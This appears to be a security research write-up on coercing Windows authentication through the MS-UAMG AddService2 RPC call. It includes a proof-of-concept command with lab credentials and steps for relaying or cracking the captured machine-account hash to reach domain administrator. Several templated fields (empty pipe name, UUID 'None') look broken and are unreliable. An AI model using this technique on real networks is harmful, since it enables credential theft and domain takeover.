# MS-UAMG - Remote call to IUpdateServiceManager2::AddService2 (opnum 18)

## Summary

+ **Protocol**: [[MS-UAMG]: Update Agent Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/aa15d914-ca63-450c-904e-6b3ebd17b441)

+ **Protocol UUID**: None

+ **Protocol version**: 0.0

+ **SMB Named pipe**: ``

+ **Function name**: [`IUpdateServiceManager2::AddService2`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/e2d037e7-b25e-40f0-bb90-3f6071085d1d)

+ **Function operation number**: `18`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-UAMG`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/aa15d914-ca63-450c-904e-6b3ebd17b441) protocol (with uuid `None` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-UAMG`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/aa15d914-ca63-450c-904e-6b3ebd17b441) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-UAMG]: Update Agent Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/aa15d914-ca63-450c-904e-6b3ebd17b441) and allows to call RPC functions of this protocol. We will then call the remote [`IUpdateServiceManager2::AddService2`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/e2d037e7-b25e-40f0-bb90-3f6071085d1d) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
IUpdateServiceManager2::AddService2('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
HRESULT AddService2(
   [in] BSTR serviceID,
   [in] LONG flags,
   [in] BSTR authorizationCabPath,
   [out, retval] IUpdateServiceRegistration** retval
 );
```

## References

+ Documentation of protocol [MS-UAMG]: Update Agent Management Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/aa15d914-ca63-450c-904e-6b3ebd17b441

+ Documentation of function `IUpdateServiceManager2::AddService2`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/e2d037e7-b25e-40f0-bb90-3f6071085d1d